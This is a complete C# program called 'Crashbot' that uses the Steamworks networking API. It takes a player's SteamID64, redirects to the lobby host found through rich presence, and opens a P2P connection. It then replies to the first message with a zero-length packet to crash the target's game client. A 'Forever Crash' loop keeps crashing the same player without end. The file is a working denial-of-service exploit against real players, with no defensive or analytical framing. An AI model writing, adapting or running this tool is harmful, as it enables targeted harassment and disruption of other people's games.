using Newtonsoft.Json.Linq;
using Steamworks;
using System.Reflection;

namespace Crashbot
{
    internal class Program
    {
        private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 500 }
            },
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = Int32.MaxValue }
            }
        ];

        private static readonly SteamNetworkingConfigValue_t[] ConnectionTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 800 }
            }
        ];

        /*
        private static readonly SteamNetworkingConfigValue_t[] PersistantTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = Int32.MaxValue }
            }
        ];
        */

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            File.WriteAllText("steam_appid.txt", "387990");

            if (!Steamworks.SteamAPI.Init())
            {
                Console.Clear();
                Console.WriteLine($"[{DateTime.Now}] SteamAPI.Init() failed!");
                return;
            }
            else
            {
                Console.Clear();
                Console.WriteLine($"[{DateTime.Now}] UserName: '" + Steamworks.SteamFriends.GetPersonaName()+"'");
                Console.WriteLine($"[{DateTime.Now}] SteamId: " + Steamworks.SteamUser.GetSteamID().m_SteamID);
                Console.WriteLine($"[{DateTime.Now}] BLoggedOn: [" + Steamworks.SteamUser.BLoggedOn()+"]");
            }

            while (true)
            {
                // Gather target
                Console.WriteLine(Environment.NewLine);
                Console.Write($"[{DateTime.Now}] Enter target SteamID64: ");

                // Pretty parse the steamid
                string steamid = Program.ReadSteamId();
                if (string.IsNullOrEmpty(steamid))
                    continue;
                ulong originalTarget = ulong.Parse(steamid);

                // Initiate user information
                CSteamID originalUser = new(originalTarget);
                var (targetName, res) = Program.GetUsersName(originalUser);
                Console.WriteLine($"[{DateTime.Now}] Targeting '{targetName}' = {res}");

                // Check if the target is the host, if not, target the host
                ulong hostTarget = Program.VerifyHostSteamid(originalUser, originalTarget);

                // Connect to the target
                Console.WriteLine($"[{DateTime.Now}] Connecting...");
                var (conn, info) = Program.ConnectAndWait(hostTarget, LongTimeoutOptions);

                // Log the result
                if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                {
                    Console.WriteLine($"[{DateTime.Now}] Connected!");
                }
                else
                {
                    Console.WriteLine($"[{DateTime.Now}] Failed to connect. Possibly Friends Only or Private");
                    continue;
                }

                // Crash the client
                Program.ReadOneAndSendOne(conn, 0, 0, 0);
                Console.WriteLine($"[{DateTime.Now}] Crashing client...");
                Thread.Sleep(500);
                Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);

                // Check if the client crashed
                Console.WriteLine($"[{DateTime.Now}] Checking target...");
                var (_, info2) = Program.ConnectAndWait(hostTarget, ConnectionTimeoutOptions);

                // Log the result
                bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
                Console.WriteLine($"[{DateTime.Now}] {(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private")}");

                // Forever Crash
                int count = 1;
                while (crashed)
                {
                    hostTarget = Program.VerifyHostSteamid(originalUser, originalTarget);
                    var (conn_x, _) = Program.ConnectAndWait(hostTarget, LongTimeoutOptions);
                    Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
                    Thread.Sleep(500);
                    Steamworks.SteamNetworkingSockets.CloseConnection(conn_x, 0, string.Empty, false);
                    Console.WriteLine($"[{DateTime.Now}] Crashed client {++count}x");
                }
            }
        }

        private static string ReadSteamId()
        {
            string steamid = Console.ReadLine()?.Trim() ?? string.Empty;
            
            if (string.IsNullOrEmpty(steamid))
                Console.WriteLine($"[{DateTime.Now}] Invalid SteamID64");

            if (steamid.Contains("http", StringComparison.InvariantCultureIgnoreCase))
                steamid = steamid.Split('/').Last();
            
            return steamid;
        }

        private static (string, bool) GetUsersName(CSteamID steamid)
        {
            var res = Steamworks.SteamFriends.RequestUserInformation(steamid, true);
            Steamworks.SteamAPI.RunCallbacks();

            string targetName = Steamworks.SteamFriends.GetFriendPersonaName(steamid);
            if (targetName.Equals("[unknown]"))
            {
                bool wait = true;
                Callback<PersonaStateChange_t>.Create(persona =>
                {
                    wait = false;
                });

                while (wait)
                {
                    Steamworks.SteamAPI.RunCallbacks();
                    Thread.Sleep(10);
                }

                targetName = Steamworks.SteamFriends.GetFriendPersonaName(steamid);
            }
            return (targetName, res);
        }

        private static ulong VerifyHostSteamid(CSteamID t, ulong original)
        {
            Steamworks.SteamFriends.RequestFriendRichPresence(t);
            Steamworks.SteamAPI.RunCallbacks();

            int keycount = Steamworks.SteamFriends.GetFriendRichPresenceKeyCount(t);
            int timeout = 100;
            while (keycount == 0 && timeout-- > 0)
            {
                Steamworks.SteamFriends.RequestFriendRichPresence(t);
                Steamworks.SteamAPI.RunCallbacks();
                keycount = Steamworks.SteamFriends.GetFriendRichPresenceKeyCount(t);
                Thread.Sleep(10);
            }

            if (timeout > 0)
            {
                string connect = Steamworks.SteamFriends.GetFriendRichPresence(t, "connect").Trim();
                string host_id = connect.Split('-', StringSplitOptions.RemoveEmptyEntries).First().Split(' ', StringSplitOptions.RemoveEmptyEntries).Last();
                ulong host_steamid = ulong.Parse(host_id);

                if (original != host_steamid)
                {
                    Console.WriteLine($"[{DateTime.Now}] Target is not host. Targeting: {host_steamid}");
                    return host_steamid;
                }
            }

            return original;
        }

        private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
        {
            CSteamID cSteamID = new(target);

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);
            HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, options.Length, options);

            Thread.Sleep(10);
            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out Steamworks.SteamNetConnectionInfo_t info);

            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ClosedByPeer)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();
                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);

                Thread.Sleep(10);
            }

            return (conn, info);
        }

        private static void ReadOneAndSendOne(HSteamNetConnection connection, IntPtr data, uint dataLen, int flags)
        {
            int maxMessages = 1;
            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(connection, data, dataLen, flags, out long _);
                    Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(connection);

                    Steamworks.SteamAPI.RunCallbacks();
                    Steamworks.SteamNetworkingSockets.RunCallbacks();
                    break;
                }
                else
                {
                    Thread.Sleep(10);
                }
            }
        }
    }
}
